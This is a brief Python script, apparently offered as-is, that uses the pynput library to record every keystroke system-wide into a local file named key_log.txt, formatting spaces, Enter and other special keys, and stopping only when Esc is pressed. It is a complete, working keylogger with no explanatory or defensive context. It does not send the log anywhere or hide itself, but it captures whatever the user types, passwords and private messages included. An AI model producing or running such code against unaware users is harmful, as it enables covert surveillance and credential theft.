from pynput.keyboard import Key, Listener

# Callback function called on every key press
def on_press(key):
    try:
        # Log alphanumeric keys
        with open("key_log.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Log special keys (Space, Enter, etc.)
        with open("key_log.txt", "a") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

# Callback function to stop the listener (e.g., pressing Esc)
def on_release(key):
    if key == Key.esc:
        return False

# Start the listener in a blocking fashion
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
